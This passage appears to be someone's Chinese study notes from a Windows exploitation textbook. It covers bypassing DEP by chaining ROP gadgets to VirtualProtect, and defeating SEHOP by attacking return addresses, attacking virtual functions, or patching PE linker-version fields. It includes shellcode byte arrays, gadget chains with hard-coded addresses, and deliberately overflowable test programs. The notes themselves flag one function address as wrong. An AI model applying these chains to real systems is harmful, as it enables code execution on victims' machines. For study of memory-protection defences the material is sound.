"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8" 
"\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\xE9\x77\xBE\x77" //修正 EBP 
"\x81\x71\xBA\x7C" //pop eax retn 
"\x0A\x1A\xBF\x7C" //pop pop pop retn 
"\x3D\x68\xBE\x7C" //pop esi retn 
"\xBF\x7D\xC9\x77" //push esp jmp eax 
"\x9B\xF4\x87\x7C" //retn 0x30 
"\x17\xF5\x96\x7C" //关闭 DEP 代码的起始位置
"\x23\x1E\x1A\x7D" //jmp esp 
"\xE9\x27\xFF\xFF" //跳转到 shellcode 起始地址
"\xFF\x90\x90\x90" 
; 
voidtest() 
{ 
 chartt[176]; 
 strcpy(tt,shellcode); 
} 
intmain() 
{ 
 HINSTANCEhInst = LoadLibrary("shell32.dll"); 
 chartemp[200]; 
 test(); 
return 0; 
} 
```

## 12.3.2 Ret2Libc 实战之利用 VirtualProtect ？？？？？？？？？？？VirtualProtect 地址错误  ？？？？？？？？？？？

​		在 DEP 的四种工作模式中，Optout 和 AlwaysON 模式下所有进程是默认开启 DEP，这时 候如果一个程序自身偶尔需要从堆栈中取指令，则会发生错误。为了解决这个问题微软提供了修改内存属性的 VirtualProtect 函数，该函数位于 kernel32.dll 中，通过该函数用户可以修改指定内存的属性，包括是否可执行属性。因此只要我们在栈帧中布置好合适的参数，并让程序转入 VirtualProtect 函数执行，就可以将 shellcode 所在内存设置为可执行状态，进而绕过DEP。

​		首先我们来看看 MSDN 上对 VirtualProtect 函数的说明。

```
BOOL VirtualProtect( 
 LPVOID lpAddress, 
 DWORD dwSize, 
 DWORD flNewProtect, 
 PDWORD lpflOldProtect 
); 
```

各参数的意义为： 

lpAddress，要改变属性的内存起始地址。

 dwSize，要改变属性的内存区域大小。

 flNewProtect，内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（0x40）时该内存页为可读可写可执行。

 pflOldProtect，内存原始属性类型保存地址。

 修改内存属性成功时函数返回非 0，修改失败时返回 0。 

如果我们能够按照如下参数布置好栈帧的话就可以将 shellcode 所在内存区域设置为可执行模式。

```
BOOL VirtualProtect( 
 shellcode 所在内存空间起始地址, 
 shellcode 大小, 
 0x40, 
 某个可写地址
); 
```

这里有两个问题需要注意。 

（1）参数中包含 0x00，strcpy 在复制字符串的时候会被截断，所以我们不能攻击 strcpy 函 数，本次实验中我们改为攻击 memcpy 函数。

 （2）对 shellcode 所在内存空间起始地址的确定，不同机器之间 shellcode 在内存中的位置 可能会有变化，本次实验中我们采用一种巧妙的栈帧构造方法动态确定 shellcode 所在内存空间 起始地址。

​		我们将用如下代码演示如何布置栈帧，并利用 VirtualProtect 函数将 shellcode 所在内存区 域设置为可执行状态，进而执行 shellcode。

```
#include<stdlib.h> 
#include<string.h> 
#include<stdio.h> 
#include<windows.h> 
char shellcode[]= 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
; 
void test() 
{ 
 char str[176]; 
 memcpy(str,shellcode,420); 
} 
int main() 
{ 
 HINSTANCE hInst = LoadLibrary("shell32.dll"); 
 char temp[200]; 
 test(); 
return 0; 
} 
```

对实验思路和代码简要解释如下。 

（1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。 

（2）函数 test 存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。 

（3）覆盖掉函数返回地址后，通过 Ret2Libc 技术，利用 VirtualProtect 函数将 shellcode 所 在内存区域设置为可执行模式。

（4）通过 push esp jmp eax 指令序列动态设置 VirtualProtect 函数中的 shellcode 所在内存起 始地址以及内存原始属性类型保存地址。 

（5）内存区域被设置成可执行模式后 shellcode 就可以正常执行了。

|           | 推荐环境         | 备注 |
| --------- | ---------------- | ---- |
| 操作系统  | windows 2003 sp2 |      |
| DEp状态   | optout           |      |
| 编译器    | VC++6.0          |      |
| 编译选项  | 禁用优化选项     |      |
| build版本 | release版本      |      |

​		首先我们来看看 VirtualProtect 函数的具体实现。如图 12.3.17 所示，VirtualProtect 只是相 当于做了一次中转，通过将进程句柄、内存地址、内存大小等参数传递给 VirtualProtectEx 函数 来设置内存的属性。我们不妨选择 0x7C801FE8 作为切入点，按照函数要求将栈帧布置好后转 入 0x7C801FE8 处执行设置内存属性过程。

![image-20220727222536075](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220727222536075.png)

​		通过图 12.3.17 我们还可以看出从 EBP+8 到 EBP+18 这 16 个字节空间中存放着设置内存属性所需要的参数。[EBP+C]和[EBP+10]这两个参数是固定的，我们可以直接在 shellcode 中设置； 但[EBP+8]和[EBP+14]这两个参数是需要动态确定的，要保证第一个参数可以落在我们可以控 制的堆栈范围内，第二个参数要保证为一可写地址，我们布置 shellcode 的重点也就放在这两个参数上边。

​		由于 EBP 在溢出过程中被破坏，所以我们需要对EBP 进行修复，首先我们用 PUSH ESP  POP EBP RETN 4 指令的地址（0x7CA7C899  查找方法与上一小节相同）覆盖 test 函数的返回地址，shellcode 如下所示。（shellcode长度计算方法与上一小节相同 起始地址为0012fdfc  返回地址0012feb0）

```
char shellcode[]= 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90"
"\x99\xc8\xa7\x7c"; //修正 EBP 
```

​		编译好程序后用 OllyDbg 加载程序，并在 0x7CA7C899（调整 EBP 入口）处下断点，然 后单步运行到 RETN 时观察内存状态，如图 12.3.18 所示。  （RETN  = 执行一次 pop eip  然后esp+4   ）

![image-20220728155832393](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220728155832393.png)

​												图 12.3.18 调整完 EBP 后内存状态

​		从图 12.3.18 中可以看到在执行完 RETN 4 后 ESP 刚好指向 EBP+8 的位置，如果此时我们 能找到类似 MOV [EBP], POP ** POP ** POP ** RETN 或者 MOV [EBP],** JMP 的指令就 可以将要修改属性的内存地址设置为当前堆栈中的某个地址了（**为什么后边要跟着 POP？ EBP+C~EBP+14 存放着 VitualProtectEx 两个固定参数，我们不能去修改它们**）。很不幸，在内存中没能找到类似的指令。换种思路，如果我们让 ESP 再向下移动 4 个字节，即让 ESP=0x0012FEC0，此时执行一条 PUSH ESP RETN/JMP 指令也是可以达到目的的。大家还 记得在上一个实验中我们“曲线救国”使用的 PUSH ESP JMP EAX 指令吧，这里依然适用， 只不过我们需要将 EAX 指向的指令修改一下。

​		稍后我们再讨论 EAX 具体指向什么样的指令，我们先来考虑一下什么样的指令能够让 ESP 向高址方向移动 4 个字节而又不影响程序的控制，大家一定想到了就是 RETN！对，单纯的一 个 RETN 指令，即可让 ESP+4 又能够收回程序的控制权。我们按上边的分析布置好 shellcode， shellcode 如下所示。

```
char shellcode[]= 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"……" 
"\x90\x90\x90\x90"
"\x99\xc8\xa7\x7c" //修正 EBP 
"\x29\x10\xA1\x7C"//RETN 
"\x90\x90\x90\x90"
"\x45\xF3\xC8\x7D"//push esp jmp eax
;
```

​	重新编译程序，然后用 OllyDbg 加载程序。在这我们建议依然在 0x7CA7C899（调整 EBP入口）处下断点，然后单步运行程序并注意观察堆栈的变化情况，来加深对堆栈调整及布局思 路的理解。运行到 JMP EAX 时暂停程序，再来观察当前内存状态。如图 12.3.19 所示

![image-20220728172347404](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220728172347404.png)											图 12.3.19 执行完 PUSH ESP 后内存状态

​		我们已经成功地将 EBP+0x8 的参数设置为当前堆栈中的某个地址，只 要我们再保证 EBP+0x14 处存放的地址为可写地址就大功告成了。如果我们能将 ESP 指向 EBP+0x18，就可以再用 PUSH ESP JMP EAX 指令来设置 EBP+0x14 的参数。观察堆栈可知此 时 ESP 指向 0x0012FEBC，EBP+0x14 指向 0x0012FEC8，ESP 只需再向高址方向移动 16 个字 节就可以指向 EBP+0x18（0x0012FECC）。虽然让 ESP 向低址方向移动而又不影响程序流程的 指令不多，但是让 ESP 向高址方向而又不影响程序流程的指令就遍地都是了，大家可以自由发 挥组合指令，本次实验我们使用类似 POP POP POP RETN 指令。

​		有了指令后如何才能让程序去执行呢？从图 12.3.19 中可以看到程序将要执行的指令为 JMP EAX，所以我们只要将 EAX 指向类似 POP POP POP RETN 指令就可以了，大家可以使用 OllyFindAddr 插件中的 Overflow return address→Find POP RETN 功能，在弹出的对话框中输入 3 就可以查找到 RETN 前有 3 次 POP 的指令了，如图 12.3.20 所示。

![image-20220728174536283](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220728174536283.png)

​					图 12.3.20 Find POP RETN 输入 POP 次数界面及部分搜索结果

​		需要注意选择的指令中不能修改 ESP、EBP、EAX，这几个寄存器的值后期都会用到，本次实验我们选择 0x7CBF1A0A处的 POP ESI POP EBX POP EDI RETN指令。我们依然采用上个实验中使用的POP EAX RETN指令来将 0x7CBF1A0A 赋值给EAX。到这里利用VirtualProtect 修改内存属性的关键部分就都搞定了，我们再搞定两个参数就可以实现这个伟大的目标了。

（1）VirtualProtect 参数之修改内存大小，在这里我们不妨设置为 0x000000FF，255 个字节的空间足够放置弹出对话框的机器码。 

（2）VirtualProtect 参数之内存新属性标志，根据 MSDN 的介绍，这里我们需要设置为 0x00000040。

根据以上分析，我们再来布置 shellcode，如下所示。

```
#include<stdlib.h> 
#include<string.h> 
#include<stdio.h> 
#include<windows.h> 
char shellcode[]= 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90"
"\x78\xD1\x57\x7D"//pop eax retn 
"\x0A\x1A\xBF\x7C"//pop pop pop retn 
"\x99\xc8\xa7\x7c" //修正 EBP 
"\x29\x10\xA1\x7C"//RETN 
"\x90\x90\x90\x90" 
"\x45\xF3\xC8\x7D"//push esp jmp eax
"\xFF\x00\x00\x00"//要修改的内存大小
"\x40\x00\x00\x00"//可读可写可执行属性代码
"\x45\xF3\xC8\x7D"//push esp jmp eax
"\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\xB2\x74\xA3\x7C"//修改内存属性
;
void test() 
{ 
 char str[176]; 
 memcpy(str,shellcode,420); 
 //_asm int 3 
} 
int main() 
{ 
 HINSTANCE hInst = LoadLibrary("shell32.dll"); 
 char temp[200]; 
 test(); 
return 0; 
} 
```

# 第 14 章 S.E.H 终极防护：SEHOP

## 14.1 SEHOP 的原理 

​		随着针对 S.E.H 的攻击日益增多，微软推出了一种新的 S.E.H 保护机制 SEHOP（Structured  Exception Handling Overwrite Protection），这是一种比 SafeSEH 更为严厉的保护机制。目前 Windows  Vista SP1、Windows 7、Windows Server 2008 和 Windows Server 2008 R2 均支持 SEHOP。

​		SEHOP 在 Windows Ser ver 2008 默认启用，而在 Windows Vista 和 Windows 7 中 SEHOP 默认是关闭的。大家可以通过以下两种方法启用 SEHOP。

（1）下载 http://go.microsoft.com/?linkid=9646972 的补丁，此补丁适用于 Windows 7 和 Windows Vista SP1。

​		（2）手工在注册表中 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session  Manager\kernel下面找到DisableExceptionChainValidation项，将该值设置为0，即可启用SEHOP。 如图 14.1.1 所示。

![image-20220729142604720](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220729142604720.png)

​		现在我们来看看 SE HOP 的新颖之处。大家知道程序中的各 S.E.H 函数是以单链表的形式存放于栈中的，而在这个链表的末端是程序的默认异常处理，它负责处理前面 S.E.H 函数都不 能处理的异常。一个典型的 S.E.H 链如图 14.1.2 所示。

![image-20220729142649775](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220729142649775.png)

​		SEHOP 的核心任务就是检查这条 S.E.H 链的完整性，在程序转入异常处理前 SEHOP 会检查 S.E.H 链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果是，则说明这 条 S.E.H 链没有被破坏，程序可以去执行当前的异常处理函数；如果检测到最后一个异常处理 函数不是终极 BOSS，则说明 S.E.H 链被破坏，可能发生了 S.E.H 覆盖攻击，程序将不会去执 行当前的异常处理函数。Alex 首次对该验证过程进行了披露，其验证代码如下：

```
if (process_flags & 0x40 == 0) { //如果没有 SEH 记录则不进行检测
if (record != 0xFFFFFFFF) { //开始检测
 do { 
 if (record < stack_bottom || record > stack_top)// SEH 记录必须位于栈中
 goto corruption; 
 if ((char*)record + sizeof(EXCEPTION_REGISTRATION) > stack_top) 
 //SEH 记录结构需完全在栈中
 goto corruption; 
 if ((record & 3) != 0) //SEH 记录必须 4 字节对齐
 goto corruption; 
 handler = record->handler; 
 if (handler >= stack_bottom && handler < stack_top) 
 //异常处理函数地址不能位于栈中
 goto corruption; 
 record = record->next; 
 } while (record != 0xFFFFFFFF); //遍历 S.E.H 链
 if ((TEB->word_at_offset_0xFCA & 0x200) != 0) { 
 if (handler != &FinalExceptionHandler)//核心检测，地球人都知道，不解释了
 goto corruption; 
 } 
 } 
}
```

请大家回顾前边关于 S.E.H 溢出攻击的讨论，思考这个检测的防御原理，如图 14.1.3 所示。

![image-20220729142828683](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220729142828683.png)

​		攻击时将 S.E.H 结构中的异常处理函数地址覆盖为跳板指令地址，跳板指令根据实际情况 进行选择。当程序出现异常的时候，系统会从 S.E.H 链中取出异常处理函数来处理异常，异常处理函数的指针已经被覆盖，程序的流程就会被劫持，在经过一系列跳转后转入 shellcode 执行。

​		由于覆盖异常处理函数指针时同时覆盖了指向下一异常处理结构的指针，这样的话 S.E.H 链就会被破坏，从而被 SEHOP 机制检测出。

​		作为对 SafeSEH 强有力的补充，SEHOP 检查是在 SafeSEH 的 RtlIsValidHandler 函数校验 前进行的，也就是说利用攻击加载模块之外的地址、堆地址和未启用 SafeSEH 模块的方法都行 不通了，必须要考虑其他的出路。理论上我们还有是三条路可以走，他们分别是：

（1）不去攻击 S.E.H，而是攻击函数返回地址或者虚函数等。 

（2）利用未启用 SEHOP 的模块。 

（3）伪造 S.E.H 链。

## 14.2 攻击返回地址

​		我们在突破 SafeSEH 时就提到过这种方法，这是一个纯考验人品的方法。如果您能够碰到 一个程序，他启用了 SEHOP 但是未启用 GS，或者启用了 GS 但是刚好被攻击的函数没有 GS 保护，什么都不要多说了，直接攻击函数返回地址。

## 14.3 攻击虚函数 

​		无论 SEHOP 有多么的强大，它保护的也只是 S.E.H，对于 S.E.H 以外的东西是不提供保护的。所以我们依然可以通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理，无 论是 SafeSEH 还是 SEHOP 都只能眼睁睁地看着程序流程被劫持。大家可以参考一下 10.3 中的 例子自己实践一下，在这我们就不做过多介绍了。

## 14.4 利用未启用 SEHOP 的模块 

​		虽然微软没有在编译器中提供禁用 SEHOP这个选项，但是出于兼容性的考虑还是对一些程序禁用 了 SEHOP，如经过 Armadilo 加壳的软件。

​		操作系统会根据 PE 头中 MajorLinkerVersion 和 MinorLinkerVersion 两个选项来判断是否为 程序禁用 SEHOP。例如，我们可以将这两个选项分别设置为 0x53 和 0x52 来模拟经过 Armadilo 加壳的程序，从而达到禁用 SEHOP 的目的。

​		搞定 SEHOP 后还需要搞定 SafeSEH，所以我们在“利用未启用 SafeSEH 模块”实验的基 础上来完成本次演示，本次实验的环境如表 14-4-1 所示。

|            | 推荐使用的环境      | 备 注                        |
| ---------- | ------------------- | ---------------------------- |
| 操作系统   | Windows 7           |                              |
| EXE 编译器 | Visual Studio 2008  |                              |
| DLL 编译器 | VC++ 6.0            | 将 dll 基址设置为 0x11120000 |
| 系统 SEHOP | 启用                |                              |
| 程序 DEP   | 关闭                |                              |
| 程序 ASLR  | EXE 随意， DLL 禁用 |                              |
| 编译选项   | 禁用优化选项        |                              |
| build 版本 | release 版本        |                              |

​		首先为 SEH_NOSaeSEH_JUMP.dll （dll文件与11.5 中相同）禁 用 SEHOP 。使用 CFF Ex plorer 打 开 SEH_  NOSaeSEH_JUMP.dll 后在 Optional header 选项页中来进行设置，分别将 MajorLinkerVersion 和 MinorLinkerVersion 设置为 0x53 和 0x52，如图 14.4.1 所示。

![image-20220729145959479](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220729145959479.png)

然后还要对演示的主程序进行一定的修改，主要包含两方面工作： 

（1）修改弹出对话框的 shellcode，让其可以在 Windows 7 下正常弹出。 

（2）取消程序的/NXCOMPAT 链接选项来禁用程序的 DEP。

​		由于在Windows 7下PEB_LDR_DATA指向加载模块列表中第二个模块位置被KERNELBASE.dll 占据，kernel32.dll 的位置由第二个变为第三个，所以我们的 shellcode 也要作出相应修改才能 够正常运行。原来 shellcode 的第 52 个字节之后插入“\x8B\x09”，该机器码对应的汇编语句为 MOV ECX,[ECX]，具体为什么加这条执行，大家自行调试一下 shellcode 就明白了。修改后的 shellcode 如下。
